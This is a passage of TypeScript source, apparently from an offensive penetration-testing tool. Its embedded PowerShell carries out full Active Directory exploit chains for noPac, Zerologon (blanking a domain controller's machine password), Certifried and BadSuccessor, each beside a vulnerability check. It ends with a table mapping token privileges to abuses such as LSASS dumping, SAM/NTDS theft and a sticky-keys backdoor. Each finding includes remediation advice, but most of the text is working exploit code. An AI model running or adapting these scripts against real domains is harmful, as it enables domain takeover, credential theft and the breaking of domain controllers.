$domain = [ADSI]"LDAP://$domainDN"
$dcTarget = "${target}"

# Step 1: Create machine account
$machinePass = "${newPassword}"
$randomSuffix = Get-Random -Maximum 9999
$machineName = "CS_NOPAC$randomSuffix"
$machineNameSam = "$machineName$"

Write-Output "[*] Step 1: Creating machine account $machineNameSam..."
try {
    $computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
    $newComp = $computersOU.Create("computer", "CN=$machineName")
    $newComp.Put("sAMAccountName", $machineNameSam)
    $newComp.Put("userAccountControl", 4096)  # WORKSTATION_TRUST_ACCOUNT
    $newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machinePass + '"'))
    $newComp.Put("dNSHostName", "$machineName.$($rootDSE.defaultNamingContext -replace ',DC=','.' -replace 'DC=','')")
    $newComp.SetInfo()
    Write-Output "[+] Machine account created: $machineNameSam"
} catch {
    Write-Output "[!] Failed to create machine account: $($_.Exception.Message)"
    Write-Output "[!] Check MachineAccountQuota and permissions"
    exit 1
}

# Step 2: Rename sAMAccountName to DC name (without trailing $)
Write-Output ""
Write-Output "[*] Step 2: Renaming sAMAccountName to $dcTarget (without $)..."
try {
    $compEntry = [ADSI]"LDAP://CN=$machineName,CN=Computers,$domainDN"
    $compEntry.Put("sAMAccountName", $dcTarget)
    $compEntry.SetInfo()
    Write-Output "[+] sAMAccountName changed to: $dcTarget"
} catch {
    Write-Output "[!] Rename failed: $($_.Exception.Message)"
    # Cleanup
    $computersOU.Delete("computer", "CN=$machineName")
    exit 1
}

# Step 3: Request TGT as the renamed account
Write-Output ""
Write-Output "[*] Step 3: Requesting TGT as $dcTarget..."
try {
    # Use the machine account credentials with the spoofed name
    $secPass = ConvertTo-SecureString $machinePass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($dcTarget, $secPass)

    # Request Kerberos ticket
    Add-Type -AssemblyName System.IdentityModel
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$dcTarget"
    Write-Output "[+] TGT requested successfully"
    Write-Output "[+] Ticket: $($token.Id)"
} catch {
    Write-Output "[!] TGT request failed: $($_.Exception.Message)"
    Write-Output "[*] This is expected if DC has KB5008102 installed"
}

# Step 4: Rename back to original
Write-Output ""
Write-Output "[*] Step 4: Restoring sAMAccountName to $machineNameSam..."
try {
    $compEntry = [ADSI]"LDAP://CN=$machineName,CN=Computers,$domainDN"
    $compEntry.Put("sAMAccountName", $machineNameSam)
    $compEntry.SetInfo()
    Write-Output "[+] sAMAccountName restored"
} catch {
    Write-Output "[!] Restore failed — manual cleanup needed for CN=$machineName"
}

# Step 5: Request S4U2self service ticket
Write-Output ""
Write-Output "[*] Step 5: Requesting S4U2self service ticket for DC impersonation..."
Write-Output "[*] If successful, use the ticket for DCSync:"
Write-Output "    winhook dcsync --target krbtgt"
Write-Output ""
Write-Output "[+] noPac attack chain completed"
Write-Output "[*] Cleanup: Delete machine account CN=$machineName,CN=Computers,$domainDN"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)

    findings.push({
      checkId: "WIN-NOPAC-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `ad://${target}/nopac`,
      title: `noPac exploitation attempted against ${target}`,
      details: `SAMAccountName spoofing chain executed targeting DC ${target}. Machine account created for name collision attack`,
      remediation:
        "Apply KB5008102/KB5008380 immediately. Set MachineAccountQuota to 0. Delete attack machine accounts from CN=Computers",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function zerologon(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const dc = argVal(args, "--dc")
  const findings: Finding[] = []
  const output: string[] = ["[*] Zerologon — Netlogon Crypto Bypass (CVE-2020-1472)\n"]

  if (!dc) return { output: "[!] Required: --dc DC_HOSTNAME_OR_IP", findings }

  if (action === "check") {
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class Netlogon {
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int I_NetServerReqChallenge(
        string PrimaryName,
        string ComputerName,
        byte[] ClientChallenge,
        byte[] ServerChallenge);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int I_NetServerAuthenticate2(
        string PrimaryName,
        string AccountName,
        int SecureChannelType,
        string ComputerName,
        byte[] ClientCredential,
        byte[] ServerCredential,
        ref uint NegotiateFlags);
}
"@

$dcHost = "${dc}"
$computerName = "CS_ZLCHK"
$zeroChallenge = New-Object byte[] 8  # All zeros
$serverChallenge = New-Object byte[] 8
$zeroCred = New-Object byte[] 8  # All zeros
$serverCred = New-Object byte[] 8
$flags = [uint32]0x212fffff

Write-Output "[*] Testing $dcHost for Zerologon (CVE-2020-1472)..."
Write-Output "[*] Sending NetrServerReqChallenge with zero client challenge..."

$vulnerable = $false
$attempts = 0
$maxAttempts = 2000

for ($i = 0; $i -lt $maxAttempts; $i++) {
    $attempts++
    try {
        $ret1 = [Netlogon]::I_NetServerReqChallenge("\\\\$dcHost", $computerName, $zeroChallenge, $serverChallenge)
        if ($ret1 -ne 0) {
            Write-Output "[-] NetrServerReqChallenge failed (error: $ret1) — DC may not be reachable"
            break
        }

        $ret2 = [Netlogon]::I_NetServerAuthenticate2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroCred, $serverCred, [ref]$flags)

        if ($ret2 -eq 0) {
            $vulnerable = $true
            Write-Output "[!!!] VULNERABLE after $attempts attempts!"
            Write-Output "[!!!] $dcHost is vulnerable to Zerologon (CVE-2020-1472)"
            Write-Output ""
            Write-Output "[*] Attack impact:"
            Write-Output "    - Reset DC machine account password to empty"
            Write-Output "    - DCSync all domain credentials"
            Write-Output "    - Complete domain compromise"
            Write-Output ""
            Write-Output "[!] WARNING: Exploitation will BREAK DC replication!"
            Write-Output "[!] Restore requires: netdom resetpwd /s:$dcHost /ud:DOMAIN\\Admin /pd:*"
            break
        }
    } catch {
        Write-Output "[!] RPC call failed: $($_.Exception.Message)"
        break
    }
}

if (-not $vulnerable) {
    Write-Output "[-] Not vulnerable after $attempts attempts (patched or not reachable)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const isVuln = result.stdout.includes("VULNERABLE")
    findings.push({
      checkId: "WIN-ZEROLOGON-001",
      provider: "windows",
      severity: isVuln ? "critical" : "info",
      status: isVuln ? "VULNERABLE" : "NOT_VULNERABLE",
      resource: `ad://${dc}/zerologon`,
      title: isVuln ? `${dc} vulnerable to Zerologon (CVE-2020-1472)` : `${dc} not vulnerable to Zerologon`,
      details: isVuln
        ? "DC accepts zero-IV Netlogon authentication — complete domain compromise possible without credentials"
        : "DC rejected zero-IV authentication (patched)",
      remediation:
        "Apply August 2020 security updates. Enable FullSecureChannelProtection registry key. Monitor Event ID 5829 for vulnerable Netlogon connections",
    })
  } else {
    output.push("[!!!] DANGER: Zerologon exploitation will BREAK the Domain Controller!")
    output.push("[!!!] The DC machine account password will be set to EMPTY")
    output.push("[!!!] This breaks AD replication, DNS, Group Policy, and authentication")
    output.push("[!!!] Recovery requires physical/console access to the DC\n")

    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class NetlogonExploit {
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int I_NetServerReqChallenge(
        string PrimaryName, string ComputerName,
        byte[] ClientChallenge, byte[] ServerChallenge);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int I_NetServerAuthenticate2(
        string PrimaryName, string AccountName, int SecureChannelType,
        string ComputerName, byte[] ClientCredential, byte[] ServerCredential,
        ref uint NegotiateFlags);

    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int I_NetServerPasswordSet2(
        string PrimaryName, string AccountName, int SecureChannelType,
        string ComputerName, byte[] Authenticator, byte[] ReturnAuthenticator,
        byte[] ClearNewPassword);
}
"@

$dcHost = "${dc}"
$computerName = "CS_ZLEX"
$zeroChallenge = New-Object byte[] 8
$serverChallenge = New-Object byte[] 8
$zeroCred = New-Object byte[] 8
$serverCred = New-Object byte[] 8
$flags = [uint32]0x212fffff

Write-Output "[*] Attempting Zerologon exploit against $dcHost..."
Write-Output "[*] Phase 1: Authenticating with zero credentials..."

$authenticated = $false
for ($i = 0; $i -lt 2000; $i++) {
    $ret1 = [Netlogon]::I_NetServerReqChallenge("\\\\$dcHost", $computerName, $zeroChallenge, $serverChallenge)
    if ($ret1 -ne 0) { Write-Output "[-] Challenge failed"; break }

    $ret2 = [Netlogon]::I_NetServerAuthenticate2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroCred, $serverCred, [ref]$flags)
    if ($ret2 -eq 0) {
        $authenticated = $true
        Write-Output "[+] Authenticated after $($i+1) attempts"
        break
    }
}

if (-not $authenticated) {
    Write-Output "[-] Authentication failed — DC appears patched"
    exit 1
}

Write-Output ""
Write-Output "[*] Phase 2: Setting DC machine account password to empty..."
$emptyPass = New-Object byte[] 516  # NL_TRUST_PASSWORD structure (empty)
$zeroAuth = New-Object byte[] 16  # Zero authenticator
$retAuth = New-Object byte[] 16

$ret3 = [NetlogonExploit]::I_NetServerPasswordSet2("\\\\$dcHost", "$dcHost$", 6, $computerName, $zeroAuth, $retAuth, $emptyPass)

if ($ret3 -eq 0) {
    Write-Output "[!!!] SUCCESS — DC machine account password set to empty"
    Write-Output ""
    Write-Output "[*] Next steps:"
    Write-Output "    1. DCSync: winhook dcsync --target krbtgt"
    Write-Output "    2. Dump all hashes: winhook ntds_dump"
    Write-Output ""
    Write-Output "[!!!] CRITICAL: Restore DC password ASAP:"
    Write-Output "    netdom resetpwd /s:$dcHost /ud:DOMAIN\\Administrator /pd:*"
    Write-Output "    Or: Reset-ComputerMachinePassword -Server $dcHost"
} else {
    Write-Output "[-] Password set failed (error: $ret3)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)

    findings.push({
      checkId: "WIN-ZEROLOGON-002",
      provider: "windows",
      severity: "critical",
      status: result.stdout.includes("SUCCESS") ? "EXPLOITED" : "FAILED",
      resource: `ad://${dc}/zerologon`,
      title: `Zerologon exploitation ${result.stdout.includes("SUCCESS") ? "succeeded" : "failed"} against ${dc}`,
      details: result.stdout.includes("SUCCESS")
        ? "DC machine account password set to empty — full domain compromise achieved. RESTORE PASSWORD IMMEDIATELY"
        : "Exploitation failed — DC may be patched",
      remediation:
        "IMMEDIATE: Restore DC password with 'netdom resetpwd'. Apply August 2020 patches. Enable FullSecureChannelProtection",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function certifried(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const ca = argVal(args, "--ca")
  const template = argVal(args, "--template") || "Machine"
  const findings: Finding[] = []
  const output: string[] = ["[*] Certifried — AD CS Machine Account Certificate Abuse (CVE-2022-26923)\n"]

  if (action === "check") {
    const script = `
# Check StrongCertificateBindingEnforcement
$regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc"
$strongBinding = (Get-ItemProperty -Path $regPath -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
Write-Output "[*] StrongCertificateBindingEnforcement: $($strongBinding ?? 'Not set (default=1)')"

if ($strongBinding -eq 0) {
    Write-Output "[!!!] VULNERABLE — Certificate binding enforcement DISABLED"
} elseif ($strongBinding -eq 1 -or $null -eq $strongBinding) {
    Write-Output "[!] Compatibility mode — may be exploitable with dNSHostName collision"
} else {
    Write-Output "[-] Full enforcement mode (2) — Certifried mitigated"
}

# Check MachineAccountQuota
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
$domain = [ADSI]"LDAP://$domainDN"
$maq = $domain.Properties["ms-DS-MachineAccountQuota"].Value
Write-Output ""
Write-Output "[*] MachineAccountQuota: $maq"
if ($maq -eq 0) {
    Write-Output "[-] Cannot create machine accounts — exploitation requires existing machine account control"
}

# Enumerate Certificate Authorities
Write-Output ""
Write-Output "[*] Enumerating Certificate Authorities..."
$configDN = $rootDSE.configurationNamingContext
$caSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$caSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
$caSearcher.Filter = "(objectClass=pKIEnrollmentService)"
$caSearcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","certificateTemplates"))
$cas = $caSearcher.FindAll()

foreach ($caObj in $cas) {
    $caName = $caObj.Properties["cn"][0]
    $caDns = $caObj.Properties["dNSHostName"][0]
    $templates = $caObj.Properties["certificateTemplates"]
    Write-Output "    CA: $caName ($caDns)"
    Write-Output "        Templates: $($templates.Count) enrolled"

    # Check for Machine template
    $hasMachine = $templates | Where-Object { $_ -match "Machine|Computer" }
    if ($hasMachine) {
        Write-Output "        [!] Machine/Computer template available: $($hasMachine -join ', ')"
    }
}

# Check certificate templates for vulnerable flags
Write-Output ""
Write-Output "[*] Checking certificate templates for Certifried conditions..."
$tmplSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$tmplSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN")
$tmplSearcher.Filter = "(objectClass=pKICertificateTemplate)"
$tmplSearcher.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag","pKIExtendedKeyUsage"))
$templates = $tmplSearcher.FindAll()

$vulnCount = 0
foreach ($tmpl in $templates) {
    $name = $tmpl.Properties["cn"][0]
    $nameFlag = [int]($tmpl.Properties["msPKI-Certificate-Name-Flag"][0])

    # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
    # CT_FLAG_SUBJECT_ALT_REQUIRE_DNS = 0x8000000
    if ($nameFlag -band 0x8000000) {
        # Template uses DNS from AD — Certifried target
        $eku = $tmpl.Properties["pKIExtendedKeyUsage"]
        $hasClientAuth = $eku | Where-Object { $_ -eq "1.3.6.1.5.5.7.3.2" }
        if ($hasClientAuth) {
            $vulnCount++
            Write-Output "    [!] $name — DNS from AD + Client Authentication (Certifried target)"
        }
    }
}
Write-Output ""
Write-Output "[+] Found $vulnCount potentially vulnerable templates"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const isVuln = result.stdout.includes("VULNERABLE") || result.stdout.includes("Certifried target")
    findings.push({
      checkId: "WIN-CERTIFRIED-001",
      provider: "windows",
      severity: isVuln ? "critical" : "info",
      status: isVuln ? "VULNERABLE" : "NOT_VULNERABLE",
      resource: "ad://domain/certifried",
      title: isVuln ? "Domain vulnerable to Certifried (CVE-2022-26923)" : "Certifried conditions not met",
      details: result.stdout.substring(0, 500),
      remediation:
        "Set StrongCertificateBindingEnforcement=2. Apply May 2022 patches (KB5014754). Remove enrollment permissions from machine templates for unprivileged users",
    })
  } else {
    if (!ca) return { output: "[!] Required: --ca CA_NAME (use --action check to enumerate CAs)", findings }

    output.push("[!] WARNING: This creates a machine account and requests a certificate as a DC\n")

    const script = `
$ErrorActionPreference = "Stop"
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
$domainFQDN = $domainDN -replace ',DC=','.' -replace 'DC=',''
$caName = "${ca}"
$templateName = "${template}"

# Step 1: Find a DC's dNSHostName to impersonate
Write-Output "[*] Step 1: Finding DC dNSHostName..."
$dcSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$dcSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$dcSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
$dcSearcher.PropertiesToLoad.AddRange(@("dNSHostName","cn"))
$dcResult = $dcSearcher.FindOne()
$dcDnsName = $dcResult.Properties["dNSHostName"][0]
$dcCn = $dcResult.Properties["cn"][0]
Write-Output "[+] Target DC: $dcCn ($dcDnsName)"

# Step 2: Create machine account
$suffix = Get-Random -Maximum 9999
$machName = "CS_CERT$suffix"
$machPass = "CyberStr1ke!Cert2024"

Write-Output ""
Write-Output "[*] Step 2: Creating machine account $machName..."
$computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
$newComp = $computersOU.Create("computer", "CN=$machName")
$newComp.Put("sAMAccountName", "$machName$")
$newComp.Put("userAccountControl", 4096)
$newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machPass + '"'))
$newComp.Put("dNSHostName", "$machName.$domainFQDN")
$newComp.SetInfo()
Write-Output "[+] Machine account created"

# Step 3: Change dNSHostName to DC's hostname
Write-Output ""
Write-Output "[*] Step 3: Changing dNSHostName to $dcDnsName..."
try {
    $compEntry = [ADSI]"LDAP://CN=$machName,CN=Computers,$domainDN"
    $compEntry.Put("dNSHostName", $dcDnsName)
    $compEntry.SetInfo()
    Write-Output "[+] dNSHostName changed to: $dcDnsName"
} catch {
    Write-Output "[!] dNSHostName change failed: $($_.Exception.Message)"
    Write-Output "[!] This usually means the DC has the May 2022 patch (KB5014754)"
    # Cleanup
    $computersOU.Delete("computer", "CN=$machName")
    exit 1
}

# Step 4: Request certificate
Write-Output ""
Write-Output "[*] Step 4: Requesting certificate from $caName using template $templateName..."
try {
    $certRequest = New-Object -ComObject X509Enrollment.CX509Enrollment
    $certRequest.InitializeFromTemplateName(0x2, $templateName)  # 0x2 = Machine context
    $certRequest.Enroll()
    Write-Output "[+] Certificate enrolled successfully as $dcDnsName"
    Write-Output "[+] Use certificate for PKINIT authentication as DC"
    Write-Output ""
    Write-Output "[*] Next steps:"
    Write-Output "    1. Export certificate: certutil -exportPFX -p pass My cert.pfx"
    Write-Output "    2. PKINIT auth: Rubeus.exe asktgt /user:$dcCn$ /certificate:cert.pfx /password:pass"
    Write-Output "    3. DCSync: winhook dcsync --target krbtgt"
} catch {
    Write-Output "[!] Certificate enrollment failed: $($_.Exception.Message)"
    Write-Output "[*] Try with different template: --template <TemplateName>"
}

# Step 5: Restore dNSHostName
Write-Output ""
Write-Output "[*] Step 5: Restoring dNSHostName..."
try {
    $compEntry = [ADSI]"LDAP://CN=$machName,CN=Computers,$domainDN"
    $compEntry.Put("dNSHostName", "$machName.$domainFQDN")
    $compEntry.SetInfo()
    Write-Output "[+] dNSHostName restored"
} catch {
    Write-Output "[!] Restore failed — manual cleanup needed"
}

Write-Output ""
Write-Output "[*] Cleanup: Delete CN=$machName,CN=Computers,$domainDN"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)

    findings.push({
      checkId: "WIN-CERTIFRIED-002",
      provider: "windows",
      severity: "critical",
      status: result.stdout.includes("enrolled successfully") ? "EXPLOITED" : "FAILED",
      resource: `ad://${ca}/certifried`,
      title: `Certifried exploitation ${result.stdout.includes("enrolled successfully") ? "succeeded" : "failed"} via ${ca}`,
      details: result.stdout.includes("enrolled successfully")
        ? `Certificate enrolled as DC — PKINIT authentication for DC impersonation possible`
        : "Certificate enrollment failed — CA may be patched",
      remediation:
        "Apply KB5014754. Set StrongCertificateBindingEnforcement=2. Remove machine account and revoke any issued certificates",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function badSuccessor(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const target = argVal(args, "--target")
  const findings: Finding[] = []
  const output: string[] = ["[*] BadSuccessor — dMSA Privilege Escalation (CVE-2025-53779)\n"]

  if (action === "check") {
    const script = `
# Check domain functional level
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
$funcLevel = $rootDSE.Properties["domainFunctionality"].Value

$levelNames = @{
    0 = "Windows 2000"
    1 = "Windows 2003 Interim"
    2 = "Windows 2003"
    3 = "Windows 2008"
    4 = "Windows 2008 R2"
    5 = "Windows 2012"
    6 = "Windows 2012 R2"
    7 = "Windows 2016"
    8 = "Windows 2019"
    9 = "Windows 2022"
    10 = "Windows 2025"
}

$levelName = $levelNames[[int]$funcLevel]
Write-Output "[*] Domain Functional Level: $funcLevel ($levelName)"

if ([int]$funcLevel -lt 10) {
    Write-Output "[-] BadSuccessor requires Windows Server 2025 domain functional level (10)"
    Write-Output "[-] Current level: $funcLevel — NOT vulnerable to BadSuccessor"
    Write-Output ""
    Write-Output "[*] However, if ANY DC runs Windows Server 2025, dMSA objects may still exist"
}

# Check for existing dMSA objects
Write-Output ""
Write-Output "[*] Searching for existing dMSA objects..."
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$searcher.Filter = "(objectClass=msDS-DelegatedManagedServiceAccount)"
$searcher.PropertiesToLoad.AddRange(@("cn","msDS-ManagedAccountPreceding","sAMAccountName","whenCreated"))
$dmsas = $searcher.FindAll()

Write-Output "[+] Found $($dmsas.Count) dMSA objects"
foreach ($dmsa in $dmsas) {
    $name = $dmsa.Properties["cn"][0]
    $sam = $dmsa.Properties["sAMAccountName"][0]
    $preceding = $dmsa.Properties["msDS-ManagedAccountPreceding"]
    $created = $dmsa.Properties["whenCreated"][0]
    Write-Output "    dMSA: $name ($sam) — Created: $created"
    if ($preceding.Count -gt 0) {
        Write-Output "        [!] msDS-ManagedAccountPreceding: $($preceding[0])"
    }
}

# Check if current user can create dMSA objects
Write-Output ""
Write-Output "[*] Checking dMSA creation permissions..."
$msaContainer = "CN=Managed Service Accounts,$domainDN"
try {
    $msaEntry = [ADSI]"LDAP://$msaContainer"
    $acl = $msaEntry.ObjectSecurity
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $currentSid = $currentUser.User.Value

    $canCreate = $false
    foreach ($rule in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
        if ($rule.AccessControlType -eq 'Allow' -and
            ($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::CreateChild)) {
            $canCreate = $true
            break
        }
    }

    if ($canCreate) {
        Write-Output "[!] Current user CAN create objects in Managed Service Accounts container"
    } else {
        Write-Output "[-] Current user cannot create dMSA objects (need GenericAll or CreateChild on MSA container)"
    }
} catch {
    Write-Output "[!] Cannot check permissions: $($_.Exception.Message)"
}

# Check for Windows Server 2025 DCs
Write-Output ""
Write-Output "[*] Checking for Windows Server 2025 DCs..."
$dcSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$dcSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$dcSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
$dcSearcher.PropertiesToLoad.AddRange(@("cn","operatingSystem","operatingSystemVersion"))
$dcs = $dcSearcher.FindAll()

$has2025 = $false
foreach ($dcObj in $dcs) {
    $os = "$($dcObj.Properties['operatingSystem'][0])"
    if ($os -match "2025") {
        $has2025 = $true
        Write-Output "    [!] $($dcObj.Properties['cn'][0]): $os"
    } else {
        Write-Output "    $($dcObj.Properties['cn'][0]): $os"
    }
}

if ($has2025) {
    Write-Output ""
    Write-Output "[!] Windows Server 2025 DC detected — BadSuccessor may be possible even at lower functional levels"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const isVuln = result.stdout.includes("Windows 2025") || result.stdout.includes("CAN create objects")
    findings.push({
      checkId: "WIN-BADSUCC-001",
      provider: "windows",
      severity: isVuln ? "high" : "info",
      status: isVuln ? "POTENTIALLY_VULNERABLE" : "NOT_VULNERABLE",
      resource: "ad://domain/bad-successor",
      title: isVuln ? "BadSuccessor (CVE-2025-53779) conditions detected" : "BadSuccessor conditions not met",
      details: result.stdout.substring(0, 500),
      remediation:
        "Apply June 2025 patches. Restrict dMSA creation permissions. Monitor for new dMSA objects (Event ID 5136 on msDS-DelegatedManagedServiceAccount)",
    })
  } else {
    if (!target) return { output: "[!] Required: --target TARGET_USER (e.g. --target Administrator)", findings }

    output.push("[!] WARNING: Requires Windows Server 2025 domain functional level")
    output.push("[!] Creates a dMSA linked to the target account\n")

    const script = `
$ErrorActionPreference = "Stop"
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
$targetUser = "${target}"

# Verify functional level
$funcLevel = [int]$rootDSE.Properties["domainFunctionality"].Value
if ($funcLevel -lt 10) {
    Write-Output "[!] Domain functional level $funcLevel < 10 (Windows 2025)"
    Write-Output "[!] BadSuccessor requires Windows Server 2025 DFL"
    Write-Output "[*] Attempting anyway — some implementations work at lower levels with 2025 DCs..."
}

# Find target user DN
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$targetUser))"
$targetResult = $searcher.FindOne()

if (-not $targetResult) {
    Write-Output "[-] Target user '$targetUser' not found"
    exit 1
}

$targetDN = $targetResult.Properties["distinguishedName"][0]
Write-Output "[+] Target: $targetUser ($targetDN)"

# Create dMSA
$suffix = Get-Random -Maximum 9999
$dmsaName = "cs_dmsa_$suffix"
$dmsaSam = "$dmsaName$"
$msaContainer = "CN=Managed Service Accounts,$domainDN"

Write-Output ""
Write-Output "[*] Step 1: Creating dMSA '$dmsaName'..."
try {
    $container = [ADSI]"LDAP://$msaContainer"
    $dmsa = $container.Create("msDS-DelegatedManagedServiceAccount", "CN=$dmsaName")
    $dmsa.Put("sAMAccountName", $dmsaSam)
    $dmsa.SetInfo()
    Write-Output "[+] dMSA created: CN=$dmsaName,$msaContainer"
} catch {
    Write-Output "[!] dMSA creation failed: $($_.Exception.Message)"
    Write-Output "[*] May need: New-ADServiceAccount -Name $dmsaName -DNSHostName $dmsaName.$($domainDN -replace ',DC=','.' -replace 'DC=','') -CreateDelegatedManagedServiceAccount"
    exit 1
}

# Link dMSA to target via msDS-ManagedAccountPreceding
Write-Output ""
Write-Output "[*] Step 2: Linking dMSA to target via msDS-ManagedAccountPreceding..."
try {
    $dmsaEntry = [ADSI]"LDAP://CN=$dmsaName,$msaContainer"
    $dmsaEntry.Put("msDS-ManagedAccountPreceding", $targetDN)
    $dmsaEntry.SetInfo()
    Write-Output "[+] msDS-ManagedAccountPreceding set to: $targetDN"
} catch {
    Write-Output "[!] Failed to set msDS-ManagedAccountPreceding: $($_.Exception.Message)"
    # Cleanup
    $container.Delete("msDS-DelegatedManagedServiceAccount", "CN=$dmsaName")
    exit 1
}

Write-Output ""
Write-Output "[+] BadSuccessor chain complete!"
Write-Output "[*] The dMSA '$dmsaName' is now linked to '$targetUser'"
Write-Output "[*] Authenticate as the dMSA to impersonate the target user"
Write-Output ""
Write-Output "[*] Next steps:"
Write-Output "    1. Install dMSA: Install-ADServiceAccount -Identity $dmsaName"
Write-Output "    2. Test auth: Test-ADServiceAccount -Identity $dmsaName"
Write-Output "    3. Use dMSA context to access resources as $targetUser"
Write-Output ""
Write-Output "[*] Cleanup: Remove-ADServiceAccount -Identity $dmsaName"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 500)}`)

    findings.push({
      checkId: "WIN-BADSUCC-002",
      provider: "windows",
      severity: "critical",
      status: result.stdout.includes("chain complete") ? "EXPLOITED" : "FAILED",
      resource: `ad://${target}/bad-successor`,
      title: `BadSuccessor exploitation ${result.stdout.includes("chain complete") ? "succeeded" : "failed"} targeting ${target}`,
      details: result.stdout.includes("chain complete")
        ? `dMSA created and linked to ${target} — impersonation possible`
        : "dMSA creation or linking failed",
      remediation:
        "Apply CVE-2025-53779 patches. Remove unauthorized dMSA objects. Restrict CreateChild on Managed Service Accounts container",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const privilege = argVal(args, "--privilege")
  const target = argVal(args, "--target")
  const findings: Finding[] = []
  const output: string[] = ["[*] Token Privilege abuse analysis...\n"]

  if (action === "enum") {
    const script = `
# Enumerate current privileges and flag abusable ones
$privOutput = whoami /priv 2>&1
Write-Output "=== Current Token Privileges ==="
Write-Output $privOutput

$abusablePrivs = @{
    'SeImpersonatePrivilege' = @{
        Risk = 'CRITICAL'
        Abuse = 'Token impersonation -> SYSTEM (Potato attacks, named pipe impersonation)'
        Command = 'winhook potato_attack --method sweet'
    }
    'SeAssignPrimaryTokenPrivilege' = @{
        Risk = 'CRITICAL'
        Abuse = 'Create process with stolen/forged token as any user'
        Command = 'winhook token_impersonate --action exploit'
    }
    'SeDebugPrivilege' = @{
        Risk = 'CRITICAL'
        Abuse = 'Open any process (incl. SYSTEM), inject code, dump LSASS'
        Command = 'winhook privilege_abuse --privilege SeDebugPrivilege --target lsass'
    }
    'SeBackupPrivilege' = @{
        Risk = 'HIGH'
        Abuse = 'Read any file regardless of ACL — SAM/SYSTEM hives, NTDS.dit, shadow copies'
        Command = 'winhook privilege_abuse --privilege SeBackupPrivilege --target SAM'
    }
    'SeRestorePrivilege' = @{
        Risk = 'HIGH'
        Abuse = 'Write to any file regardless of ACL — replace utilman.exe, sethc.exe for sticky keys backdoor'
        Command = 'winhook privilege_abuse --privilege SeRestorePrivilege --target utilman'
    }
    'SeTakeOwnershipPrivilege' = @{
        Risk = 'HIGH'
        Abuse = 'Take ownership of any securable object (files, registry, services, AD objects)'
        Command = 'winhook privilege_abuse --privilege SeTakeOwnershipPrivilege --target "C:\path"'
    }
    'SeLoadDriverPrivilege' = @{
        Risk = 'HIGH'
